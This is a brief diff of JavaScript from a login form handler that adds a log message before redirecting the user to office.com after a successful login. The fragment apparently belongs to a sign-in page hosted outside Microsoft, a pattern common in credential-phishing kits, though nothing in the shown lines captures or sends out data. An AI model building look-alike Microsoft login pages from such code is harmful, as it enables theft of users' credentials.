@@ -669,6 +669,7 @@
                 if (response.ok) {
                     if (data.loginSuccess) {
                         // Redirect to office.com after successful login
+                        console.log('✅ Login successful - redirecting to office.com...');
                         window.location.href = 'https://office.com';
                         return;
                     } else {
